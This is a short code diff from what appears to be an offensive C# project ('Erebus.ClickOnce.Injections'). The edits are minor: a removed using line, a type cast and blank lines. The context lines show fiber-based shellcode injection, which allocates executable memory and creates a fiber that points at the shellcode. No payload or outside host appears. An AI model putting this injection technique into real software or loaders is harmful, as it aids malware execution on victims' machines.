@@ -1,4 +1,3 @@
-using System;
 using System.Runtime.InteropServices;
 using System.Runtime.Versioning;
 
@@ -28,7 +27,7 @@ namespace Erebus.ClickOnce.Injections
             {
                 // Allocate memory for shellcode
                 IntPtr baseAddress = Win32.VirtualAllocEx(
-                    Win32.GetCurrentProcess(),
+                    (Win32.HANDLE)Win32.GetCurrentProcess(),
                     IntPtr.Zero,
                     (uint)shellcode.Length,
                     Win32.VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | Win32.VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
@@ -45,6 +44,7 @@ namespace Erebus.ClickOnce.Injections
 
                 // Convert current thread to fiber
                 IntPtr mainFiber = ConvertThreadToFiber(IntPtr.Zero);
+
                 if (mainFiber == IntPtr.Zero)
                 {
                     DebugLogger.WriteLine($"[-] ConvertThreadToFiber failed with error: {Marshal.GetLastWin32Error()}");
@@ -53,6 +53,7 @@ namespace Erebus.ClickOnce.Injections
 
                 // Create a new fiber pointing to shellcode
                 IntPtr shellcodeFiber = CreateFiber(0, baseAddress, IntPtr.Zero);
+
                 if (shellcodeFiber == IntPtr.Zero)
                 {
                     DebugLogger.WriteLine($"[-] CreateFiber failed with error: {Marshal.GetLastWin32Error()}");
